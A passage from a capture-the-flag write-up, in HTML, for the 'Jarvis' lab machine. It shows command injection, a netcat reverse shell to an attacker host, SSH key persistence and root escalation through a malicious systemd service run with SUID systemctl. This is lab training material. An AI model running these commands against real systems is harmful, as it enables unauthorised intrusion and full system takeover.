+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@ironhackers.es<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ***********************************************<br>
+                <br>
+                Enter&nbsp;an&nbsp;IP:&nbsp;$(/bin/bash)<br>
+                $(/bin/bash)<br>
+                pepper@jarvis:/var/www/html$&nbsp;id<br>
+                id<br>
+                pepper@jarvis:/var/www/html$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        You'll notice that you don't get any output from commands.<br>
+        No idea why. I solved this with a reverse shell.<br>
+        <br>
+        Listen on your attacking machine:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Start a reverse shell using <code>nc</code>.<br>
+            <div class="codebox">
+                pepper@jarvis:/var/www/html$&nbsp;nc&nbsp;10.10.14.11&nbsp;9002&nbsp;-e&nbsp;/bin/bash<br>
+                nc&nbsp;10.10.14.11&nbsp;9002&nbsp;-e&nbsp;/bin/bash
+            </div>
+        </div><br>
+        <br>
+        And you should receive a fully functional shell as <code>pepper</code> on your listener.<br>
+            <div class="codebox">
+                ...<br>
+                connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.143]&nbsp;32912<br>
+                id<br>
+                uid=1000(pepper)&nbsp;gid=1000(pepper)&nbsp;groups=1000(pepper)<br>
+                python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                pepper@jarvis:/var/www/html$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        At this point, I decided to configure ssh access to the box so that I could have a reliable connection and a fully-interactive shell.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Configure ssh access to pepper</strong></h2><br>
+        Read your own public key from <code>~/.ssh/id_rsa.pub</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;cat&nbsp;~/.ssh/id_rsa.pub<br>
+                ssh-rsa&nbsp;AAAAB3Nz<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>cd</code> into <code>pepper</code>'s ssh directory, create the <code>authorized_keys</code> file and copy your attacking machine's public key into <code>pepper</code>'s <code>authorized_keys</code> file.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;cd&nbsp;.ssh<br>
+                pepper@jarvis:~/.ssh$&nbsp;touch&nbsp;authorized_keys<br>
+                pepper@jarvis:~/.ssh$&nbsp;echo&nbsp;"ssh-rsa&nbsp;AAAAB3Nz..."&nbsp;&gt;&gt;&nbsp;authorized_keys
+            </div>
+        </div><br>
+        <br>
+        Now you have ssh access to the box.<br>
+        Grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;ssh&nbsp;pepper@10.10.10.143<br>
+                The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;'10.10.10.143&nbsp;(10.10.10.143)'&nbsp;can't&nbsp;be&nbsp;established.<br>
+                ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256:oPoKu2vmqVfC1e3TJJ5ZB8yL/2/W2YIrglCm8FTTuSs.<br>
+                Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;continue&nbsp;connecting&nbsp;(yes/no)?&nbsp;yes<br>
+                ...<br>
+                pepper@jarvis:~$&nbsp;cat&nbsp;user.txt<br>
+                2afa36...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) pepper to root</strong></h2><br>
+        Have a look for any SUID (setuid) binaries on the system.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;find&nbsp;/&nbsp;-perm&nbsp;-u=s&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null<br>
+                /bin/mount<br>
+                /bin/ping<br>
+                /bin/systemctl<br>
+                /bin/umount<br>
+                /bin/su<br>
+                /usr/bin/newgrp<br>
+                /usr/bin/passwd<br>
+                /usr/bin/gpasswd<br>
+                /usr/bin/chsh<br>
+                /usr/bin/sudo<br>
+                /usr/bin/chfn<br>
+                /usr/lib/eject/dmcrypt-get-device<br>
+                /usr/lib/openssh/ssh-keysign<br>
+                /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+            </div>
+        </div><br>
+        <br>
+        <code>systemctl</code> is an odd result.<br>
+        <code>systemctl</code> is a command that starts systemd services.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;ls&nbsp;-l&nbsp;/bin/systemctl<br>
+                -rwsr-x---&nbsp;1&nbsp;root&nbsp;pepper&nbsp;174520&nbsp;Feb&nbsp;17&nbsp;03:22&nbsp;/bin/systemctl
+            </div>
+        </div><br>
+        We can execute <code>systemctl</code> too since its group owner, <code>pepper</code>, has execute permissions.<br>
+        We're currently logged in as <code>pepper</code>, so we're part of the ‘pepper’ group.<br>
+        <br>
+        If we can create our own service and write it into <code>/etc/systemd/system</code> where the systemd services are stored, we will have command execution as root.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;touch&nbsp;/etc/systemd/system/test.txt<br>
+                touch:&nbsp;cannot&nbsp;touch&nbsp;'/etc/systemd/system/test.txt':&nbsp;Permission&nbsp;denied
+            </div>
+        </div><br>
+        <br>
+        But we can't write to <code>/etc/systemd/system</code> :/<br>
+        Have a look at the directory instead.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;ls&nbsp;-l&nbsp;/etc/systemd/system<br>
+                total&nbsp;20<br>
+                drwxr-xr-x&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:49&nbsp;getty.target.wants<br>
+                drwxr-xr-x&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Jun&nbsp;25&nbsp;08:34&nbsp;multi-user.target.wants<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;35&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:57&nbsp;mysqld.service&nbsp;-&gt;&nbsp;/lib/systemd/system/mariadb.service<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;35&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:57&nbsp;mysql.service&nbsp;-&gt;&nbsp;/lib/systemd/system/mariadb.service<br>
+                drwxr-xr-x&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:49&nbsp;network-online.target.wants<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;25&nbsp;Jun&nbsp;25&nbsp;08:34&nbsp;root.service&nbsp;-&gt;&nbsp;/home/pepper/root.service<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;31&nbsp;Mar&nbsp;&nbsp;2&nbsp;11:14&nbsp;sshd.service&nbsp;-&gt;&nbsp;/lib/systemd/system/ssh.service<br>
+                drwxr-xr-x&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:49&nbsp;sysinit.target.wants<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;35&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:49&nbsp;syslog.service&nbsp;-&gt;&nbsp;/lib/systemd/system/rsyslog.service<br>
+                lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;25&nbsp;Jun&nbsp;25&nbsp;08:27&nbsp;test.service&nbsp;-&gt;&nbsp;/home/pepper/test.service<br>
+                drwxr-xr-x&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Mar&nbsp;&nbsp;2&nbsp;08:57&nbsp;timers.target.wants
+            </div>
+        </div><br>
+        <br>
+        You'll see 2 files which have symlinks to files in <code>pepper</code>'s home directory:<br>
+        • <code>lrwxrwxrwx 1 root root 25 Jun 25 08:34 root.service -&gt; /home/pepper/root.service</code><br>
+        • <code>lrwxrwxrwx 1 root root 25 Jun 25 08:27 test.service -&gt; /home/pepper/test.service</code><br>
+        <br>
+        This means we can create a <code>root.service</code> service file in <code>pepper</code>'s home directory and, because there's a symlink pointing to our maliciously created <code>/home/pepper/root.service</code> in <code>/etc/systemd/system</code>, we can get command execution as root.<br>
+        <br>
+        <code>cd</code> to <code>/home/pepper</code> and write your malicious service.<br>
+        I wrote a reverse shell.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;cd&nbsp;/home/pepper<br>
+                pepper@jarvis:~$&nbsp;nano&nbsp;root.service<br>
+                [Unit]<br>
+                Description=shellpls&nbsp;systemd&nbsp;service<br>
+                <br>
+                [Service]<br>
+                Type=simple<br>
+                ExecStart=/bin/sh&nbsp;-c&nbsp;"nc&nbsp;10.10.14.11&nbsp;9003&nbsp;-e&nbsp;/bin/bash"<br>
+                <br>
+                [Install]<br>
+                WantedBy=multi-user.target
+            </div>
+        </div><br>
+        <br>
+        Prep a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;nc&nbsp;-lvnp&nbsp;9003<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        and run your malicious <code>root.service</code> service using <code>systemctl</code>.<br>
+            <div class="codebox">
+                pepper@jarvis:~$&nbsp;systemctl&nbsp;start&nbsp;root.service<br>
+                Warning:&nbsp;root.service&nbsp;changed&nbsp;on&nbsp;disk.&nbsp;Run&nbsp;'systemctl&nbsp;daemon-reload'&nbsp;to&nbsp;reload&nbsp;units.<br>
+                pepper@jarvis:~$&nbsp;systemctl&nbsp;daemon-reload<br>
+                pepper@jarvis:~$&nbsp;systemctl&nbsp;start&nbsp;root.service<br>
+                pepper@jarvis:~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        You've served yourself a root shell!<br>
+        Grab <code>root.txt</code>.<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.143]&nbsp;41886<br>
+                id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                cat&nbsp;/root/root.txt<br>
+                d41d8...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
